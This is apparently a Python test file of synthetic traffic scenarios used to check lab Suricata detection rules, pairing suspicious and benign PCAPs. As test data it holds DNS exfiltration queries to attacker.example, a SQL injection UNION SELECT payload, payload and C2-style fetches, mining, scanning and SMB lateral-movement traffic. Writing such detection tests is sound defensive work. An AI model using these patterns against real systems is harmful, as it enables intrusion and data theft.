"""Traffic scenarios for the Suricata rules: each declares the exact set of
lab SIDs that must fire when its PCAP is replayed (empty = must stay quiet)."""

from __future__ import annotations

from collections.abc import Callable

from tests.suricata.pcaps import (
    INTERNET,
    KALI,
    RESOLVER,
    SOC_HOST,
    WEB_SERVER,
    WORKSTATION,
    Pcap,
    self_signed_cert_der,
    smb2_create,
    smb2_create_response,
    smb2_tree_connect,
    smb2_tree_connect_response,
    tls_client_hello,
    tls_server_hello_with_cert,
)

SCENARIOS: dict[str, tuple[Callable[[Pcap], None], set[int]]] = {}


def scenario(*sids: int):
    def register(build: Callable[[Pcap], None]):
        SCENARIOS[build.__name__] = (build, set(sids))
        return build

    return register


# ------------------------------------------------------------ C2 / HTTP
@scenario(1000001)
def http_post_burst(p):
    for _ in range(10):
        p.http(WORKSTATION, INTERNET, "POST", "/api/v2/checkin", body=b"id=7f3a&s=ok", gap=30)


@scenario()
def http_post_below_threshold(p):
    for _ in range(9):
        p.http(WORKSTATION, INTERNET, "POST", "/api/v2/checkin", body=b"id=7f3a&s=ok", gap=30)


@scenario(1000004)
def tls_openssl_default_certificate(p):
    p.tcp_session(
        WORKSTATION,
        INTERNET,
        443,
        [tls_client_hello("update-cdn.example")],
        [tls_server_hello_with_cert(self_signed_cert_der("Internet Widgits Pty Ltd"))],
    )


@scenario()
def tls_ordinary_certificate(p):
    p.tcp_session(
        WORKSTATION,
        INTERNET,
        443,
        [tls_client_hello("www.example.com")],
        [tls_server_hello_with_cert(self_signed_cert_der("Example Corp"))],
    )


@scenario(1000005)
def curl_from_workstation(p):
    p.http(WORKSTATION, INTERNET, "GET", "/payload.bin", {"User-Agent": "curl/8.5.0"})


@scenario()
def curl_from_soc_vlan_is_suppressed(p):
    """threshold.config suppresses 1000005 for the SOC management VLAN."""
    p.http(SOC_HOST, INTERNET, "GET", "/health", {"User-Agent": "curl/8.5.0"})


@scenario(1000006)
def python_requests_user_agent(p):
    p.http(WORKSTATION, INTERNET, "GET", "/c2/task", {"User-Agent": "python-requests/2.32.3"})


@scenario()
def browser_user_agent(p):
    p.http(WORKSTATION, INTERNET, "GET", "/index.html")


# ------------------------------------------------------------ DNS
@scenario(1000002)
def dns_oversized_label(p):
    p.dns(WORKSTATION, "aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRlZCBkYXRhMTIz.exfil.attacker.example")


@scenario()
def dns_ordinary_lookup(p):
    p.dns(WORKSTATION, "www.wikipedia.org")


@scenario(1000003)
def dns_query_flood(p):
    for i in range(100):
        p.dns(WORKSTATION, f"host{i}.example.com", gap=0.2)


@scenario()
def dns_flood_from_resolver_is_suppressed(p):
    """The internal resolver forwards in bursts; threshold.config exempts it."""
    for i in range(100):
        p.dns(RESOLVER, f"host{i}.example.com", dst=INTERNET, gap=0.2)


@scenario(1000009)
def dns_txt_encoded_label(p):
    p.dns(WORKSTATION, "dGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl.t.attacker.example", qtype="TXT")


@scenario()
def dns_txt_dmarc_lookup(p):
    p.dns(WORKSTATION, "_dmarc.example.com", qtype="TXT")


@scenario(1000008)
def dns_mining_pool(p):
    p.dns(WORKSTATION, "pool.supportxmr.com")


@scenario(1000024)
def dns_zone_transfer_attempt(p):
    p.dns_tcp(KALI, "corp.lab", "AXFR", RESOLVER)


# ------------------------------------------------------------ mining / recon / web
@scenario(1000007)
def stratum_mining_subscribe(p):
    p.tcp_session(
        WORKSTATION,
        INTERNET,
        3333,
        [b'{"id":1,"method":"mining.subscribe","params":["xmrig/6.21.0"]}\n'],
        [b'{"id":1,"result":[["mining.notify","ae6812eb4cd7735a302a8a9dd95cf71f"],"08000002",4],"error":null}\n'],
    )


@scenario(1000010)
def syn_scan_from_attacker_vlan(p):
    for port in range(20, 50):
        p.raw_tcp(KALI, WORKSTATION, port, "S", gap=0.01)


@scenario()
def syn_burst_below_threshold(p):
    for port in range(20, 40):
        p.raw_tcp(KALI, WORKSTATION, port, "S", gap=0.01)


@scenario(1000011)
def syn_fin_scan(p):
    p.raw_tcp(KALI, WORKSTATION, 445, "SF")


@scenario(1000012)
def sql_injection_union_select(p):
    p.http(
        KALI,
        WEB_SERVER,
        "GET",
        "/item.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-",
        {"User-Agent": "sqlmap/1.8"},
    )


@scenario()
def search_containing_union(p):
    p.http(KALI, WEB_SERVER, "GET", "/search?q=union+station+opening+hours")


@scenario(1000013)
def repeated_outbound_non_standard_port(p):
    for _ in range(5):
        p.tcp_session(WORKSTATION, INTERNET, 4444, [b"\x00\x01hello"], [b"\x00\x02"], gap=10)


@scenario()
def repeated_outbound_https(p):
    for _ in range(5):
        p.tcp_session(WORKSTATION, INTERNET, 443, [b"\x16\x03\x01\x00\x05hello"], [], gap=10)


# ------------------------------------------------------------ anomalies
@scenario(1000020)
def icmp_oversized_echo(p):
    p.icmp_echo(WORKSTATION, INTERNET, 1200)


@scenario()
def icmp_ordinary_ping(p):
    p.icmp_echo(WORKSTATION, INTERNET, 56)


@scenario(1000021)
def icmp_echo_flood(p):
    for _ in range(50):
        p.icmp_echo(WORKSTATION, INTERNET, 56, gap=0.5)


@scenario(1000022)
def http_on_non_standard_port(p):
    p.http(WORKSTATION, INTERNET, "GET", "/gate.php", dport=8081)


@scenario(1000027)
def tor_or_port(p):
    p.tcp_session(WORKSTATION, INTERNET, 9001, [b"\x00\x00\x07\x00\x06\x00\x03\x00\x04\x00\x05"], [])


@scenario(1000029)
def ftp_cleartext_login(p):
    p.tcp_session(
        WORKSTATION,
        INTERNET,
        21,
        [b"USER backup\r\n", b"PASS Summer2026!\r\n"],
        [b"220 ProFTPD Server ready\r\n", b"331 Password required\r\n", b"230 Logged in\r\n"],
    )


@scenario(1000030)
def telnet_session(p):
    p.tcp_session(WORKSTATION, WEB_SERVER, 23, [b"\xff\xfb\x18\xff\xfb\x1f", b"admin\r\n"], [b"\xff\xfd\x18login: "])


# ------------------------------------------------------------ SMB
@scenario(1000025)
def smb_admin_share_from_attacker_vlan(p):
    p.tcp_session(
        KALI,
        WORKSTATION,
        445,
        [smb2_tree_connect(f"\\\\{WORKSTATION}\\ADMIN$", 2)],
        [smb2_tree_connect_response(2, tree_id=1, pipe=False)],
    )


@scenario(1000026)
def psexec_pipe_between_internal_hosts(p):
    p.tcp_session(
        SOC_HOST,
        WORKSTATION,
        445,
        [smb2_tree_connect(f"\\\\{WORKSTATION}\\IPC$", 2), smb2_create("PSEXESVC", 3, tree_id=5)],
        [smb2_tree_connect_response(2, tree_id=5, pipe=True), smb2_create_response(3, tree_id=5)],
    )


@scenario()
def smb_file_share_between_internal_hosts(p):
    p.tcp_session(
        SOC_HOST,
        WEB_SERVER,
        445,
        [smb2_tree_connect(f"\\\\{WEB_SERVER}\\Data", 2)],
        [smb2_tree_connect_response(2, tree_id=1, pipe=False)],
    )
